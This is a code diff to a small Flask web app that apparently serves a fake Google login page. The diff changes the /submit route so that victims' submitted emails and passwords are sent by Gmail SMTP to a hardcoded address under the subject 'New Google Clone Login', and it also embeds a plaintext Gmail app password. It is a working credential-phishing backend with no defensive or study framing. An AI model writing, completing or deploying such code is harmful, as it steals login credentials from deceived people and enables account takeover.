@@ -1,7 +1,14 @@
-from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, render_template
+import smtplib
+from email.mime.text import MIMEText
 import os
 
-app = Flask(__name__, static_folder='static')
+app = Flask(__name__)
+
+# === CHANGE THIS ===
+EMAIL_SENDER = "davideje12345@gmail.com"
+EMAIL_PASSWORD = "mgikbmggpkpivaln"  # Use the Gmail App Password
+EMAIL_RECEIVER = "davideje12345@gmail.com"  # Can be same as sender
 
 @app.route('/')
 def index():
@@ -14,15 +21,25 @@ def password():
 @app.route('/submit', methods=['POST'])
 def submit():
     data = request.get_json()
-    email = data.get('email')
-    password = data.get('password')
-    print(f"Email: {email}, Password: {password}")
-    return jsonify({'message': 'Credentials received'})
+    email = data.get("email")
+    password = data.get("password")
 
-# Explicit route to serve static files (for some deployment platforms)
-@app.route('/static/<path:filename>')
-def static_files(filename):
-    return send_from_directory(os.path.join(app.root_path, 'static'), filename)
+    msg = MIMEText(f"Email: {email}\nPassword: {password}")
+    msg["Subject"] = "New Google Clone Login"
+    msg["From"] = EMAIL_SENDER
+    msg["To"] = EMAIL_RECEIVER
+
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+        return jsonify({"status": "success"})
+    except Exception as e:
+        print("Error:", e)
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
